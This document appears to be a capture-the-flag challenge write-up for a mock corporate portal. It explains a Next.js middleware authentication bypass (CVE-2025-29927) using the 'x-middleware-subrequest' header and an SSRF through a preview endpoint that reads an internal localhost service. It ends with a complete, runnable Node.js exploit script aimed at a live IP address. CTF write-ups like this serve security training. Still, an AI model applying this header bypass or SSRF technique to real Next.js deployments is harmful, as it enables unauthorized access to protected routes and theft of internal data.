**Description**

SecureCorp has recently deployed an internal web portal designed to streamline employee workflows, handling everything from sensitive administrative operations to confidential content previews. However, preliminary security assessments indicate potential vulnerabilities in the portal's access control mechanisms and input validation systems. A skilled attacker could potentially chain multiple implementation flaws to achieve unauthorized access and data exfiltration.

**Objectives**

- Conduct thorough reconnaissance of the portal's attack surface
- Identify and exploit authentication bypass vulnerabilities  
- Leverage server-side request forgery (SSRF) flaws for internal network access
- Chain exploits to retrieve both components of the segmented flag

> **Note:** This challenge implements a **two-stage exploitation** scenario where the flag is deliberately split into **2 distinct parts**, each requiring different attack vectors to recover.

---

**Flag Format**

```
CITEFLAG{...}
```

---

**🔗 Challenge Access**  → [🌐 http://134.209.31.135:8917](http://134.209.31.135:8917/)

---

**👤 Author**: *xtle0o0*

---

## Vulnerability Analysis

### Stage 1: Next.js Middleware Authentication Bypass (CVE-2025-29927)

The application utilizes Next.js middleware for access control, which contains a critical vulnerability allowing authentication bypass through header manipulation.

A simple recon on the app could lead you to the tech stack used and nextjs version

**Vulnerability Details:**
- **CVE**: CVE-2025-29927
- **Impact**: Complete authentication bypass for protected routes
- **Root Cause**: Improper handling of internal middleware headers

**Exploitation Vector:**
```javascript
const adminResponse = await axios.get(`${HOST}/api/admin`, {
  headers: { 'x-middleware-subrequest': '1' }
});
```

The `x-middleware-subrequest` header tricks the middleware into treating the request as an internal subrequest, bypassing authentication checks and granting access to the `/api/admin` endpoint.

### Stage 2: Server-Side Request Forgery (SSRF) via Preview API

The application's preview functionality accepts arbitrary URLs without proper validation, enabling SSRF attacks against internal services.

**Vulnerability Details:**
- **Location**: `/api/preview` endpoint
- **Impact**: Internal network reconnaissance and data exfiltration
- **Root Cause**: Insufficient URL validation and lack of allowlist controls

**Exploitation Vector:**
```javascript
const ssrfResponse = await axios.post(`${HOST}/api/preview`, {
  url: 'http://localhost:3001/flag'
});
```

This payload forces the server to make a request to an internal service (`localhost:3001`) that contains the second part of the flag.

---

## Challenge Hints (Released After Initial Solving Period)

After observing no successful submissions, the following hints were provided:

1. **Stage 1 Hint**: "CVE-2025-29927" - Points to the Next.js middleware vulnerability
2. **Stage 2 Hint**: "SSRF via preview API" - Indicates the second vulnerability type and location

---

## Complete Exploitation Script

```javascript
#!/usr/bin/env node
const axios = require('axios');

const HOST = process.argv[2] || 'http://134.209.31.135:8917';
console.log(`Target host: ${HOST}`);

async function solve() {
  try {
    // Stage 1: Exploit Next.js middleware bypass
    const adminResponse = await axios.get(`${HOST}/api/admin`, {
      headers: { 'x-middleware-subrequest': '1' }
    });

    let adminContent = adminResponse.data;
    let adminHtmlString = typeof adminContent === 'string' ? adminContent : JSON.stringify(adminContent);

    // Extract first flag part
    let firstpart = 'Flag part 1 not found';
    if (typeof adminContent === 'object') {
      if (adminContent.flagPart) {
        firstpart = adminContent.flagPart;
      } else if (adminContent.flag) {
        firstpart = adminContent.flag;
      }
    }
    if (firstpart === 'Flag part 1 not found') {
      const match = adminHtmlString.match(/CITEFLAG\{[^\}]+\}|"flagPart"\s*:\s*"([^"]+)"/);
      if (match) {
        firstpart = match[1] || match[0];
      }
    }

    // Stage 2: Exploit SSRF vulnerability
    const ssrfResponse = await axios.post(`${HOST}/api/preview`, {
      url: 'http://localhost:3001/flag'
    });

    const previewData = ssrfResponse.data;
    let secondpart = 'Flag part 2 not found';
    if (previewData.flag) {
      secondpart = previewData.flag;
    } else if (previewData.preview) {
      const m = previewData.preview.match(/"flag"\s*:\s*"([^"]+)"/);
      if (m) secondpart = m[1];
    }

    // Combine flag parts
    let completeFlag;
    if (firstpart.endsWith('}')) {
      completeFlag = firstpart;
    } else {
      completeFlag = `${firstpart}${secondpart}`;
    }
    console.log(completeFlag);

  } catch (error) {
    if (error.response) {
      console.error(`Status: ${error.response.status}`);
      console.error('Headers:', error.response.headers);
      console.error('Data:', error.response.data);
    } else {
      console.error(error.message);
    }
  }
}

solve();
```
